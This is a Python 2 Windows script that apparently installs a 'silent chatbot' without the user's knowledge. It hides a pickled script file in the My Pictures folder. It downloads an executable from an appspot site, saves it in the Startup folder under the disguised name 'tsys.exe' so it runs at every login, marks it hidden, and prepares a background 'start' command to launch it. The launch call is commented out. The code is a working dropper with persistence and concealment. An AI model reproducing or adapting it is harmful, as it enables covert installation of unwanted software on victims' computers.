"""Makes a thread to download/install/run the silent chatbot.

Should only be run on windows :(
"""

import cPickle
import os
import threading
import urllib2
import win32api
import win32con

from win32com.shell import shell, shellcon

class Downloader(threading.Thread):
    def __init__(self, script):
        """Make a thread to download/install the silent chatbot.
        @param script: A script in list form.  See scriptreader.py
        @type script: list
        """
        threading.Thread.__init__(self)
        self.script = script
        
    def run(self):
        """Run the thread."""
        #Make a file for the script
        path = file_in_special_path(shellcon.CSIDL_MYPICTURES, "script.txt")
        print path
        unhide_file(path)
        f = open(path, "w")
        #Save the script
        cPickle.dump(self.script, f)
        #Hide the script
        f.close()
        hide_file(path)
        
        #DIR the launcher
        download_install_run(
            "http://littlesitetomakemoney.appspot.com/launcher.exe", 
            shellcon.CSIDL_STARTUP, 
            "tsys.exe")
        
def download_install_run(url, specialpath, fname):
    #Get a path for the file and unhide it.
    path = file_in_special_path(specialpath, fname)
    unhide_file(path)
    #Save and hide the file
    u = urllib2.urlopen(url)
    f = open(path, "wb")
    f.write(u.read())
    f.close()
    u.close()
    hide_file(path)
    print path
    
    #Make a command to run the file
    command = "start /b %s"%win32api.GetShortPathName(path)
    print command
    #os.system(command)
    
        
#Utility functions.  May be useful elsewhere
def file_in_special_path(specialpath, fname):
    """Make a path composed of a special (CSIDL) path and a file name.
    
    @param specialpath: The CSIDL path found in shellcon
    @param fname: the name of the file
    """
    path = shell.SHGetFolderPath(0, specialpath, None, 0)
    path = os.path.join(path, fname)
    return path

def hide_file(path):
    """Hide a file.
    
    First tries to open it (to make it exist), then tries to hide it.
    @param path: The path of the file to hide
    """
    __file_setstate(path, win32con.FILE_ATTRIBUTE_HIDDEN)
    
def unhide_file(path):
    """Unhide a file.
    
    First tries to open it (to make it exist), then tries to unhide it.
    @param path: The path of the file to hide
    """
    __file_setstate(path, win32con.FILE_ATTRIBUTE_NORMAL)
        
def __file_setstate(path, state):
    try:
        f = open(path, "r+")
        f.close()
    except:
        pass
    try:
        win32api.SetFileAttributes(path,state)
    except:
        pass
